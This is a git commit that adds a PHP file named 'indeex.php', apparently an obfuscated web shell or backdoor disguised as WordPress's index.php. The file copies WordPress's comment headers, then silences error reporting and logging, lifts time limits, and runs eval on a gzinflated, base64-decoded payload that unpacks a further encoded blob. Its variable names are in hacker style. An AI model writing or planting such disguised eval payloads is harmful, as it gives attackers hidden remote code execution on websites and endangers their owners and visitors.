8f254bd58c10b9bb3350f93e9ad32d61bc0ce0b3
Stefan Pejcic <pejcha1994@gmail.com>
2022-03-25 11:05:44 +0100

    Create indeex.php

---
+++ 25.03.2022/indeex.php
@@ -0,0 +1,19 @@
+<?php  @clearstatcache(); @set_time_limit(0); @error_reporting(0); @ini_set('error_log',NULL); @ini_set('log_errors',0); @ini_set('display_errors', 0);
+/**
+ * Front to the WordPress application. This file doesn't do anything, but loads                            
+ * wp-blog-header.php which does and tells WordPress to load the theme.                                    
+ *                                                           
+ * @package WordPress                                                   
+ */
+                                                                                                               
+/**
+ * Tells WordPress to load the WordPress theme and output it.                      
+ *                
+ * @var bool              
+ */
+$UeXploiT = "Sy1LzNFQKyzNL7G2V0svsYYw9YpLiuKL8ksMjTXSqzLz0nISS1K\x42rNK85Pz\x63gqLU4mLq\x43\x43\x63lFqe\x61m\x63Snp\x43\x62np6Rq\x41O0sSi3TUHHMM8iLN64IyMnPDEkN0kQ\x431g\x41\x3d";
+$An0n_3xPloiTeR = "xzM0KtWxdd\x2bv9q\x4391Z\x62nwZg//O9L0u\x43UM\x63TJQ2Rr/Y\x43/ls6\x62IYy1S6\x41Ondel\x61j\x63IM\x62o2WpkI2EE\x61VyehitWrUy21t8\x619t1KNYV\x41Vx\x611V\x42kSLijw1v5jr\x43wy\x433150X\x43Dg\x43PlgEq6jq2mgXPXeiy78ZnXsG\x61d\x41/pHps1MdXv06kiWOFUFgs8wwq\x41u\x61Pw6OtYFUWkWE\x2b7Z\x61zKwvr\x62dF6GnY0n3JfzxkYyOJHPdT/gxxr/oi48Q9/6PLVj0N2l2wJtrPRR0sjF8TrVEYokZRXv86/ORvLxn\x41otz6Jmu3LWh\x413725G\x42ioWp/SgEZ71z87\x620mov\x62KeIvDi0MpJ\x61E1hr7oDpIuT8I3j\x63Mvh9Fh7gyONyiIJDjIMD\x62MmZJ\x2bD\x63M8D\x614guWy85GRwt9GrQnzQhNML\x42\x42Nj2\x63JkuNIPZh46pOT\x62VmtdX\x43RlE\x43eG\x43q\x61rum/2nZPHnf1z5\x63Gu\x41TE\x43edNpJvzvTw\x61rzNLmz\x62\x61ESIvqT25Yp5stRods5vU0OoJs2UE6D9vw7GS\x42MDvUXS2o/HG\x41e\x42wJe\x2bzX\x41DGg/3F\x41i\x42wJe\x2bzW\x41TGg/nF\x41m\x42wJe\x2bzV\x41jGg/XF\x41q\x42wJe";
+eval(htmlspecialchars_decode(gzinflate(base64_decode($UeXploiT))));
+exit;
+/** Loads the WordPress Environment and Template */
+?>
